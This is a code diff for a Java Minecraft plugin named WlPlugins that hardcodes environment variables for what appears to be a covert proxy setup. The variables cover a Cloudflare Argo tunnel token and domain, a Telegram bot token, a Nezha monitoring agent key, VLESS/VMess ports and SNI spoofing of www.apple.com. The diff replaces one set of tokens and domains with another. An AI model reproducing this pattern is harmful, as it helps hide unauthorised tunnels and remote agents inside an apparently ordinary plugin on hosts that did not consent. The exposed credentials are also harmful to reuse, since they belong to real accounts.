@@ -37,8 +37,8 @@ public class WlPlugins extends JavaPlugin {
     }
 
     private static void loadEnvVars(Map<String, String> envVars) {
-        envVars.put("TOK", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiMzk0NDk4OGEtNmNiNy00ZGFjLWFlNDQtMGQ2YWFjNTliODQxIiwicyI6Ik56bGhNVE5pWVRBdFlqVmxaQzAwWldRMUxUbGtOMkV0TkdJMk5UTmtPR0ppTnpJeCJ9");
-        envVars.put("ARGO_DOMAIN", "great-es.yvy.pp.ua");
+        envVars.put("TOK", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiM2U0OGI5NTAtZWFmMC00YjU3LWFhZmEtMTZmNjEwYTM4ZGFiIiwicyI6Ik1XVXpOemt5T1dRdFl6a3hNeTAwWW1RMkxUZ3pZMkl0T1RWa1pHRmpPRFk1WkRnNSJ9");
+        envVars.put("ARGO_DOMAIN", "swiftservers-nl.omi.pp.ua");
         envVars.put("TUNNEL_PROXY", "");
 
         envVars.put("TG", "5958841738 8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
@@ -48,16 +48,16 @@ public class WlPlugins extends JavaPlugin {
         envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_TLS", "1");
-        envVars.put("AGENT_UUID", "0d0a14aa-469f-4eb1-8657-2ed3a5dc0c86");
+        envVars.put("AGENT_UUID", "6e19f0fd-c034-4e5e-a52a-03b43237065b");
 
         envVars.put("TMP_ARGO", "3x");
         envVars.put("VL_PORT", "8002");
         envVars.put("VM_PORT", "9123");
         envVars.put("CF_IP", "saas.sin.fan");
-        envVars.put("SUB_NAME", "Great-ES");
-        envVars.put("SERVER_PORT", "20459");
+        envVars.put("SUB_NAME", "swiftservers");
+        envVars.put("SERVER_PORT", "");
         envVars.put("second_port", "");
-        envVars.put("UUID", "0d0a14aa-469f-4eb1-8657-2ed3a5dc0c86");
+        envVars.put("UUID", "6e19f0fd-c034-4e5e-a52a-03b43237065b");
         
         envVars.put("second_port", "");
         envVars.put("SNI", "www.apple.com");
